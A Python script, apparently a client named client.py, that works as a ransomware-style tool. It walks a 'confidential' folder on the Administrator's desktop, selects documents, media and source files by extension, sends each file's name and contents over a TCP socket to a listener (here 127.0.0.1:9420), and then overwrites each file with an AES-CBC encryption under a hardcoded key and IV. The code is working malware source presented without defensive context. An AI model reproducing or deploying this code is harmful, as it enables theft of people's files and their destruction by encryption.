import string,os,time,sys
from socket import *
from Crypto.Cipher import AES

def chuan(file_path,filename):
    '''
    file_path: 文件的路径，用于打开传输
    filename: 文件名字用于传输报头
    '''
    #制作报头
    file_size = os.path.getsize(file_path)
    filename =filename.encode() + b' '*(30 - len(filename.encode()))
    file_size =str(file_size).encode() + b' '*(20- len(str(file_size).encode()))
    ok = filename + file_size
    #传输报头
    sock.send(ok)
    #文件传输           
    f = open(file_path,'rb')
    while True:
        data = f.read(2048)
        if not data:                   
            break
        sock.send(data)
    f.close()
# 加密函数
def mimi(file_path1):
    # 设置秘钥和IV4
    obj = AES.new(b'This is a key123', AES.MODE_CBC, b'This is an IV456')
    #读取要加密的文件
    f=  open(file_path1,'rb')
    data = b''
    while True:

	    abc = f.read(1000)
	    if not abc:
		    break
	    data += abc
    f.close()
    #使加密的数据能够被16整除
    a  = len(data)
    b = 16 - (a%16)
    data = data + bytes("\n" * b,encoding = 'utf-8')
    #os.remove('a.txt')
    mass = data 
    #数据加密
    ciphertext = obj.encrypt(mass)
    with open(file_path1,'wb') as f:
	    f.write(ciphertext)



if __name__ == "__main__":
    drive_list = []
    adc = ('127.0.0.1',9420)
    sock = socket(AF_INET,SOCK_STREAM)
    sock.connect(adc)

    #找电脑的磁盘
    for c in string.ascii_uppercase:
        drive = c + ':'
        if os.path.isdir(drive):
            drive_list.append(drive)
#遍历磁盘
    for v in [r'c:/Users/Administrator/Desktop/机密']:
        for root, dirs, files in os.walk(v):
            for f in files:
                if os.path.splitext(f)[1] == '.mp3' or os.path.splitext(f)[1] == '.md' or  os.path.splitext(f)[1] == '.py' or os.path.splitext(f)[1] == '.txt' or os.path.splitext(f)[1] == '.avi' or os.path.splitext(f)[1] == '.mp4' or os.path.splitext(f)[1] == '.rmvb' or os.path.splitext(f)[1] == '.docx':
                    if f == 'client.py':
                        continue
                    abk = os.path.join(root,f)
                    try:
                        p = open(abk,'rb')
                        p.close()
                        chuan(abk,f)
                        mimi(abk)
                    except FileNotFoundError:
                        pass
    sock.close()



        